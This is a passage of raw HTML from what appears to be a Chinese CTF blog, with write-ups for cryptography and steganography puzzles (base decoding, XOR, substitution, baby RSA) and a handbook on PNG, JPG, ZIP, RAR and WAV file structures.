class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span>(<span class="params">s1, s2</span>):</span></span><br><span class="line">    base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span>():</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;steg.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="keyword">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += bin(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">&#x27;0&#x27;</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="keyword">print</span> goflag(bin_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goflag</span>(<span class="params">bin_str</span>):</span></span><br><span class="line">    res_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.lanzous.com&#x2F;i9zuwhi base16&#x2F;32&#x2F;58&#x2F;64&#x2F;85&#x2F;91&#x2F;92</span><br></pre></td></tr></table></figure><p>访问下载文件。尝试不同的base解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> base91</span><br><span class="line"><span class="keyword">import</span> base58</span><br><span class="line"><span class="keyword">import</span> py3base92</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_to_str</span>(<span class="params">s</span>):</span></span><br><span class="line">        k=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">2</span>):</span><br><span class="line">                j = s[i]+s[i+<span class="number">1</span>]</span><br><span class="line">                k+=chr(int(j,<span class="number">16</span>))</span><br><span class="line">        print(<span class="string">&#x27;16&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ba32</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = base64.b32decode(s)</span><br><span class="line">        s = bytes.decode(s)</span><br><span class="line">        print(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ba58</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = base58.b58decode(s)</span><br><span class="line">        s = bytes.decode(s)</span><br><span class="line">        print(<span class="string">&#x27;58&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ba64</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = base64.b64decode(s)</span><br><span class="line">        s = bytes.decode(s)</span><br><span class="line">        print(<span class="string">&#x27;64&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">baa85</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = base64.a85decode(s)</span><br><span class="line">        s = bytes.decode(s)</span><br><span class="line">        print(<span class="string">&#x27;a85&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bab85</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = base64.b85decode(s)</span><br><span class="line">        s = bytes.decode(s)</span><br><span class="line">        print(<span class="string">&#x27;b85&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ba91</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = base91.decode(s)</span><br><span class="line">        s = s.decode()</span><br><span class="line">        print(<span class="string">&#x27;91&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ba92</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = py3base92.decode(s)</span><br><span class="line">        print(<span class="string">&#x27;91&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>(<span class="params">s</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">                <span class="keyword">if</span> len(s)&lt;<span class="number">50</span>:</span><br><span class="line">                        print(s)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                        s=hex_to_str(s)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                                s=ba32(s)</span><br><span class="line">                        <span class="keyword">except</span>:</span><br><span class="line">                                <span class="keyword">try</span>:</span><br><span class="line">                                        s=ba58(s)</span><br><span class="line">                                <span class="keyword">except</span>:</span><br><span class="line">                                        <span class="keyword">try</span>:</span><br><span class="line">                                                s=ba64(s)</span><br><span class="line">                                        <span class="keyword">except</span>:</span><br><span class="line">                                                <span class="keyword">try</span>:</span><br><span class="line">                                                        s = baa85(s)</span><br><span class="line">                                                <span class="keyword">except</span>:</span><br><span class="line">                                                        <span class="keyword">try</span>:</span><br><span class="line">                                                                s=bab85(s)</span><br><span class="line">                                                        <span class="keyword">except</span>:</span><br><span class="line">                                                                <span class="keyword">try</span>:</span><br><span class="line">                                                                        s = ba92(s)</span><br><span class="line">                                                                <span class="keyword">except</span>:</span><br><span class="line">                                                                        <span class="keyword">try</span>:</span><br><span class="line">                                                                                s=ba91(s)</span><br><span class="line">                                                                        <span class="keyword">except</span>:</span><br><span class="line">                                                                                print(<span class="string">&#x27;nonono&#x27;</span>)</span><br><span class="line">                                                                                </span><br><span class="line"><span class="keyword">if</span>  __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">        f = open(<span class="string">&#x27;steg.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        s = f.read()</span><br><span class="line">        start(s)</span><br></pre></td></tr></table></figure><p>当出现的值为TkVLTFdUQVpvUlNda1ZXRUpAZVldTltgJCQhLCAgGSknPjc=时base64解码出现乱码。这应该是解密到最后的文件。终于发现原来需要异或。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;TkVLTFdUQVpvUlNda1ZXRUpAZVldTltgJCQhLCAgGSknPjc=&#x27;</span></span><br><span class="line">s=base64.b64decode(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">res=j^(k+i)</span><br><span class="line">flag+=chr(res)</span><br><span class="line">k+=<span class="number">1</span></span><br><span class="line">print(i,flag)</span><br></pre></td></tr></table></figure><h3 id="有趣起来了"><a href="#有趣起来了" class="headerlink" title="有趣起来了"></a>有趣起来了</h3><p>密⽂前部分应该是HDCTF 所以应该是置换成字⺟倒序 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">de =<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#123;&#125;&#x27;</span></span><br><span class="line">en = <span class="string">&#x27;zyxwvutsrqponmlkjihgfedcba&#123;&#125;&#x27;</span></span><br><span class="line">string = <span class="string">&#x27;swxgu&#123;nlivrmgvivhgrmtxlwv&#125;&#x27;</span></span><br><span class="line">output = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">28</span>): </span><br><span class="line">        <span class="keyword">if</span> i == en[j]: </span><br><span class="line">            output+=de[j] </span><br><span class="line">            print(output)</span><br></pre></td></tr></table></figure><h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><p>给出一个endeocde.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;*****************************&quot;</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">c = pow(int(b2a_hex(flag),<span class="number">16</span>),e,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line">c = <span class="number">68405618655091231850901459679785989915772760467494039910176075122809565696913</span></span><br></pre></td></tr></table></figure><p>拿到p、q、c、e，我们可以求出d。</p><h2 id="网题"><a href="#网题" class="headerlink" title="网题"></a>网题</h2><h3 id="天干地支"><a href="#天干地支" class="headerlink" title="天干地支"></a>天干地支</h3><p><img src="file://C:/Users/12521/Desktop/md/35.png?lastModify=1604280427" alt="35"></p><p>天干有十个，地支有十二个，六十甲子<br> 题目提示天干地支+甲子<br> 所以这里用刚刚文件里的内容对照甲子的顺序数+60，通过ASCII码转换得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-密码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-杂项手册</title>
      <link href="2019/05/10/CTF-%E6%9D%82%E9%A1%B9%E6%89%8B%E5%86%8C/"/>
      <url>2019/05/10/CTF-%E6%9D%82%E9%A1%B9%E6%89%8B%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF杂项手册"><a href="#CTF杂项手册" class="headerlink" title="CTF杂项手册"></a>CTF杂项手册</h1><h3 id="图片base64"><a href="#图片base64" class="headerlink" title="图片base64"></a>图片base64</h3><p>base64图片头：<code>data:image/jpg;base64,</code>。</p><h3 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h3><h4 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h4><p>文件头总是由位固定的字节来描述，剩余的部分由 3 个以上的 PNG 的数据块（Chunk）按照特定的顺序组成。</p><p>总体来说就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件头 89 50 4E 47 0D 0A 1A 0A + 数据块 + 数据块 + 数据块……</span><br></pre></td></tr></table></figure><h5 id="数据块-CHUNk"><a href="#数据块-CHUNk" class="headerlink" title="数据块 CHUNk"></a>数据块 CHUNk</h5><p>PNG 定义了两种类型的数据块，一种是称为关键数据块（critical chunk），这是标准的数据块，另一种叫做辅助数据块（ancillary chunks），这是可选的数据块。关键数据块定义了 4 个标准数据块，每个 PNG 文件都必须包含它们，PNG 读写软件也都必须要支持这些数据块。</p><p>也就是说有的数据块是可选的，有的是必须有的，我们就介绍一下必须有的数据块。</p><p>对于每个数据块都有着统一的数据结构，每个数据块由 4 个部分组成。</p><table><thead><tr><th align="center">Length（长度）</th><th>4 字节</th><th>指定数据块中数据域的长度，其长度不超过（231－1）字节</th></tr></thead><tbody><tr><td align="center">Chunk Type Code（数据块类型码）</td><td>4 字节</td><td>数据块类型码由 ASCII 字母（A - Z 和 a - z）组成</td></tr><tr><td align="center">Chunk Data（数据块数据）</td><td>可变长度</td><td>存储按照 Chunk Type Code 指定的数据</td></tr><tr><td align="center">CRC（循环冗余检测）</td><td>4 字节</td><td>存储用来检测是否有错误的循环冗余码</td></tr></tbody></table><h5 id="文件头数据块IHDR"><a href="#文件头数据块IHDR" class="headerlink" title="文件头数据块IHDR"></a>文件头数据块IHDR</h5><p>文件头数据块 IHDR（Header Chunk）：它包含有 PNG 文件中存储的图像数据的基本信息，由 13 字节组成，并要作为第一个数据块出现在 PNG 数据流中，而且一个 PNG 数据流中只能有一个文件头数据块。</p><p>文件头数据块（IHDR）定义了PNG文件的宽高、色深、压缩方法等参数。</p><p>上面我们讲了每个数据块都包含四个部分：</p><ul><li>长度（Length）：4 bytes</li><li>数据块类型（Chunk Type）：4 bytes</li><li>数据块数据（Chunk Data）：Length bytes</li><li><strong>CRC</strong>校验码：4 bytes，由Chunk Type和Chunk Data</li></ul><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/22.png" alt="22"></p><h5 id="图像结束数据IEND"><a href="#图像结束数据IEND" class="headerlink" title="图像结束数据IEND"></a>图像结束数据IEND</h5><p>图像结束数据 IEND（image trailer chunk）：它用来标记 PNG 文件或者数据流已经结束，并且必须要放在文件的尾部。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 49 45 4E 44 AE 42 60 82</span><br></pre></td></tr></table></figure><p>IEND 数据块的长度总是 <code>00 00 00 00</code>，数据标识总是 IEND <code>49 45 4E 44</code>，因此，CRC 码也总是 <code>AE 42 60 82</code>。</p><h5 id="图像数据块IDAT"><a href="#图像数据块IDAT" class="headerlink" title="图像数据块IDAT"></a>图像数据块IDAT</h5><p>图像数据块 IDAT（image data chunk）：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p><p>IDAT 块只有当上一个块充满时，才会继续一个新的块。使用pngcheck工具进行检查，如果前一个数据块没有满，而后一个数据块有数据，则说明这里隐藏了信息。</p><h4 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h4><p>JPEG（Joint Photographic Experts Group）是联合图像专家小组的英文缩写。它由国际电话与电报咨询委员会CCITT（The International Telegraph and Telephone Consultative Committee）与国际标准化组织ISO于1986年联合成立的一个小组，负责制定静态数字图像的编码标准。</p><p>JPEG算法压缩出来的静态图片文件称为JPEG文件，扩展名通常为.jpg、.jpe、jpeg。</p><p>JPEG文件大体上可以分成两个部分：标记码(Tag)和压缩数据。</p><p>标记码由两个字节构成，其前一个字节是固定值0xFF，后一个字节则根据不同意义有不同数值。在每个标记码之前还可以添加数目不限的无意义的0xFF填充，也就说连续的多个0xFF可以被理解为一个0xFF，并表示一个标记码的开始。而在一个完整的两字节的标记码后，就是该标记码对应的压缩数据流，记录了关于文件的诸种信息。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/24.png" alt="24"></p><p>常用的标记有<a href="http://blog.csdn.net/lpt19832003/article/details/Editor/FCKeditor/editor/fckeditor.html?InstanceName=ctl00_ContentPlaceHolder1_EntryEditor1_richTextEditor_richTextEditor&Toolbar=Default#SOI">SOI</a>、<a href="http://blog.csdn.net/lpt19832003/article/details/Editor/FCKeditor/editor/fckeditor.html?InstanceName=ctl00_ContentPlaceHolder1_EntryEditor1_richTextEditor_richTextEditor&Toolbar=Default#APP0">APP0</a>、<a href="http://blog.csdn.net/lpt19832003/article/details/Editor/FCKeditor/editor/fckeditor.html?InstanceName=ctl00_ContentPlaceHolder1_EntryEditor1_richTextEditor_richTextEditor&Toolbar=Default#DQT">DQT</a>、<a href="http://blog.csdn.net/lpt19832003/article/details/Editor/FCKeditor/editor/fckeditor.html?InstanceName=ctl00_ContentPlaceHolder1_EntryEditor1_richTextEditor_richTextEditor&Toolbar=Default#SOF">SOF0</a>、<a href="http://blog.csdn.net/lpt19832003/article/details/Editor/FCKeditor/editor/fckeditor.html?InstanceName=ctl00_ContentPlaceHolder1_EntryEditor1_richTextEditor_richTextEditor&Toolbar=Default#DHT">DHT</a>、<a href="http://blog.csdn.net/lpt19832003/article/details/Editor/FCKeditor/editor/fckeditor.html?InstanceName=ctl00_ContentPlaceHolder1_EntryEditor1_richTextEditor_richTextEditor&Toolbar=Default#DRI">DRI</a>、<a href="http://blog.csdn.net/lpt19832003/article/details/Editor/FCKeditor/editor/fckeditor.html?InstanceName=ctl00_ContentPlaceHolder1_EntryEditor1_richTextEditor_richTextEditor&Toolbar=Default#SOS">SOS</a>、<a href="http://blog.csdn.net/lpt19832003/article/details/Editor/FCKeditor/editor/fckeditor.html?InstanceName=ctl00_ContentPlaceHolder1_EntryEditor1_richTextEditor_richTextEditor&Toolbar=Default#EOI">EOI</a>。</p><p>注意，SOI等都是标记的名称。在文件中，标记码是以标记代码形式出现。例如SOI的标记代码为0xFFD8，即在JPEG文件中的如果出现数据0xFFD8，则表示此处为一个SOI标记。</p><p>常用标记的标记代码、占用字节长度和表示的意义。</p><p>SOF0</p><table><thead><tr><th>序号</th><th>名称</th><th>长度</th><th>描述</th></tr></thead><tbody><tr><td>①</td><td>数据长度</td><td>2 字节</td><td>①~⑥ 六个字段的总长度，即不包括标记代码，但包括本字段</td></tr><tr><td>②</td><td>精度</td><td>1 字节</td><td>每个数据样本的位数，通常是 8 位，一般软件都不支持 12 位和 16 位</td></tr><tr><td>③</td><td>图像高度</td><td>2 字节</td><td>图像高度（单位：像素），如果不支持 DNL 就必须 &gt; 0</td></tr><tr><td>④</td><td>图像宽度</td><td>2 字节</td><td>图像宽度（单位：像素），如果不支持 DNL 就必须 &gt; 0</td></tr><tr><td>⑤</td><td>颜色分量数</td><td>1 字节</td><td>只有 3 个数值可选<br/> 1：灰度图；3：YCrCb 或 YIQ；4：CMYK；<br/> 而 JFIF 中使用 YCrCb，故这里颜色分量数恒为 3</td></tr><tr><td>⑥</td><td>颜色分量信息</td><td>颜色分量数×3字节（通常为 9 字节）</td><td>《颜色分量信息表格》</td></tr></tbody></table><p>通常找到FFC0，之后的第三个到第七个字节就是长度和宽度。</p><h4 id="ZIP"><a href="#ZIP" class="headerlink" title="ZIP"></a>ZIP</h4><p>一个 ZIP 文件由三个部分组成：</p><p>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志。</p><ul><li><p>压缩源文件数据区：</p><p>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br><strong>00 00：全局方式位标记（有无加密）</strong><br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>00 00：扩展记录长度 </p></li><li><p>压缩源文件目录区：</p><p>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br><strong>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</strong><br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量</p></li><li><p>压缩源文件目录结束标志： </p><p>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小<br>3E 00 00 00：目录区对第一张磁盘的偏移量<br>00 00：ZIP 文件注释长度</p></li></ul><p>总结：通过<strong>压缩源文件目录区50 4B 01 02 1F 00 14 00 0奇/偶 00 来表示是否加密</strong>。</p><h4 id="RAR"><a href="#RAR" class="headerlink" title="RAR"></a>RAR</h4><h5 id="文件格式-1"><a href="#文件格式-1" class="headerlink" title="文件格式"></a>文件格式</h5><p>RAR 文件主要由标记块，压缩文件头块，文件头块，结尾块组成。Rar压缩包的文件头为 <code>0x 52 61 72 21 1A 07 00</code>。</p><p>RAR的标记块和结束块都是固定的7字节序列，分别为0x52 61 72 21 1A 07 00和0xC4 3D 7B 00 40 07 00。文件块这边要注意一下HEAD_FLAGS这个头部，其中HEAD_FLAGS的低三位代表加密标志，此位若被置为1，则文件使用了基于密钥的加密。</p><h5 id="每个块的组成"><a href="#每个块的组成" class="headerlink" title="每个块的组成"></a>每个块的组成</h5><table><thead><tr><th align="left">名称</th><th align="left">大小</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">HEAD_CRC</td><td align="left">2</td><td align="left">全部块或块部分的CRC</td></tr><tr><td align="left">HEAD_TYPE</td><td align="left">1</td><td align="left">块类型</td></tr><tr><td align="left">HEAD_FLAGS</td><td align="left">2</td><td align="left">阻止标志</td></tr><tr><td align="left">HEAD_SIZE</td><td align="left">2</td><td align="left">块大小</td></tr><tr><td align="left">ADD_SIZE</td><td align="left">4</td><td align="left">可选字段 - 添加块大小</td></tr></tbody></table><h5 id="结尾快"><a href="#结尾快" class="headerlink" title="结尾快"></a>结尾快</h5><p>结尾快（Terminator）都是固定的。</p><table><thead><tr><th align="left">Field Name</th><th align="left">Size (bytes)</th><th align="left">Possibilities</th></tr></thead><tbody><tr><td align="left">HEAD_CRC</td><td align="left">2</td><td align="left">Always 0x3DC4</td></tr><tr><td align="left">HEAD_TYPE</td><td align="left">1</td><td align="left">Header type: 0x7b</td></tr><tr><td align="left">HEAD_FLAGS</td><td align="left">2</td><td align="left">Always 0x4000</td></tr><tr><td align="left">HEAD_SIZE</td><td align="left">2</td><td align="left">Block size = 0x0007</td></tr></tbody></table><h4 id="MKV"><a href="#MKV" class="headerlink" title="MKV"></a>MKV</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# file &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;ogreman&#39; </span><br><span class="line">&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;ogreman: Matroska data</span><br></pre></td></tr></table></figure><h4 id="WAV"><a href="#WAV" class="headerlink" title="WAV"></a>WAV</h4><h5 id="RIFF格式"><a href="#RIFF格式" class="headerlink" title="RIFF格式"></a>RIFF格式</h5><p>「 Resource Interchange File Format（简称RIFF），资源交换文件格式，是一种按照标记区块存储数据（tagged chunks）的通用文件存储格式，多用于存储音频、视频等多媒体数据.Microsoft在windows下的AVI、ANI 、WAV等都是基于RIFF实现的。</p><p>RIFF是由chunk构成的，chunk是RIFF组成的基本单位，每个CHUNK可看作存贮了视频的一帧数据或者是音频的一帧数据。</p><h5 id="CHUNK的结构"><a href="#CHUNK的结构" class="headerlink" title="CHUNK的结构"></a>CHUNK的结构</h5><p>CHUNK总共由三个部分组成：</p><ul><li>FOURCC  使用4字节的ASIIC字符标识类型</li><li>SIZE       数据的大小</li><li>DATA      用于存放数据</li></ul><p>CHUNK在一般情况下不能嵌套，但是当CHUNK的FOURCC为”RIFF”或者是”LIST”的时候可以嵌套数据。</p><p>“RIFF”的第一个CHUNK的FOURCC一定是”RIFF”，所以FOURCC为LIST的一定是子CHUNK及SUBCHUNK。</p><p>“RIFF”的CHUNK在DATA区域的前四个字节称为”Form Type”记录了数据的类型，比如我们的wav文件的Form Type就是”WAV”。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/38.png" alt="38"></p><h5 id="脉冲编码调制（PCM）"><a href="#脉冲编码调制（PCM）" class="headerlink" title="脉冲编码调制（PCM）"></a>脉冲编码调制（PCM）</h5><p>「PCM 脉冲编码调制是Pulse Code Modulation的缩写，脉冲编码调制是数字通信的编码方式之一.主要过程是将话音、图像等模拟信号每隔一定时间进行取样，使其离散化，同时将抽样值按分层单位四舍五入取整量化，同时将抽样值按一组二进制码来表示抽样脉冲的幅值。」</p><h5 id="WAV文件的CHUNK信息"><a href="#WAV文件的CHUNK信息" class="headerlink" title="WAV文件的CHUNK信息"></a>WAV文件的CHUNK信息</h5><p>WAVE文件是由若干个CHUNK组成的.按照文件中CHUNK的出现顺序分别为：RIFF Chunk, Format Chunk, Fact Chunk, Data Chunk,其中的Fact CHUNK为非必要部分，结构具体如下图所示：</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/39.png" alt="39"></p><p>RIFF是头CHUNK,而Format CHUNK里面记录了WAV的各种参数信息，详细参数信息如下：</p><ul><li>FormatTag       音频数据的编码方式，其中PCM方式为1</li><li>Channels        声道数，单声道为1，双声道为2</li><li>SamplesPerSec   采样率(每秒样本数)</li><li>BytesPerSec*     音频数据传送速率</li><li>BlockAlign*      每次采样的大小</li><li>BitsPerSample*   每个声道的采样精度</li></ul><h5 id="Python代码"><a href="#Python代码" class="headerlink" title="Python代码"></a>Python代码</h5><figure 